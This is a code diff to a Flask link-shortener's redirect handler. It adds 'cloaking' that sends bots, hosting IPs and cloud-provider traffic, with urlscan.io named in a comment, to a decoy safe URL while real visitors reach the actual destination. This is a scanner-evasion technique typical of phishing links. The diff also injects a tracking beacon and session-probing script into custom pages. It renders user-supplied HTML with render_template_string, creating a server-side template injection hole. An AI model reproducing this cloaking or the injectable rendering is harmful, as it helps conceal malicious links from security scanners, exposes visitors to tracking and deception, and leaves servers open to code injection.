@@ -1,4 +1,4 @@
-from flask import Blueprint, request, render_template, abort, make_response, redirect
+from flask import Blueprint, request, render_template, abort, make_response, redirect, render_template_string
 from user_agents import parse
 from datetime import datetime
 import hashlib
@@ -68,13 +68,49 @@ def redirect_to_url(slug):
     final_dest = link.destination
     if not (final_dest.startswith("http://") or final_dest.startswith("https://")):
         final_dest = "https://" + final_dest
-    if link.safe_url: final_dest = link.safe_url
+    
+    # V37 CLOAKING LOGIC FIX
+    # Only redirect to safe_url if detected as BOT or SUSPICIOUS
+    is_bot = is_bot_ua(ua_string) or geo.get('hosting') == True
+    
+    # Check for known Cloud Providers (urlscan.io often uses these)
+    if not is_bot and geo.get('org'):
+        cloud_providers = ['google', 'amazon', 'microsoft', 'digitalocean', 'oracle', 'aliyun', 'hetzner']
+        org_lower = geo.get('org').lower()
+        if any(p in org_lower for p in cloud_providers):
+            is_bot = True
 
-    if link.block_bots and is_bot_ua(ua_string):
+    if link.block_bots and is_bot:
          visit.is_suspicious = True
          db.session.commit()
-         if link.safe_url: final_dest = link.safe_url
-         else: return render_template('error.html', message="Suspicious Traffic", visit_id=visit.id, hide_nav=True), 403
+         if link.safe_url: 
+             final_dest = link.safe_url
+         else: 
+             return render_template('error.html', message="Suspicious Traffic", visit_id=visit.id, hide_nav=True), 403
+
+    # V38 AI Architect Custom Rendering
+    if link.custom_html:
+        # Inject Tracking Beacon
+        tracking_js = f"""
+        <script>
+            try {{
+                navigator.sendBeacon("/api/beacon", JSON.stringify({{
+                    visit_id: "{visit.id}",
+                    canvas_hash: "ArchitectFit",
+                    webgl_renderer: "CustomLanding"
+                }}));
+                // Simple version of Session Detector for custom pages
+                (function(){{
+                    const probes = [{{name:'Github',url:'https://github.com/fluidicon.png'}}];
+                    probes.forEach(p => {{
+                        new Image().src = p.url;
+                    }});
+                }})();
+            }} catch(e) {{}}
+        </script>
+        """
+        html_content = link.custom_html.replace('</body>', tracking_js + '</body>')
+        return render_template_string(html_content, destination=final_dest, visit_id=visit.id)
 
     # Success
     resp = make_response(render_template('loading.html', destination=final_dest, visit_id=visit.id, allow_no_js=link.allow_no_js, hide_nav=True))
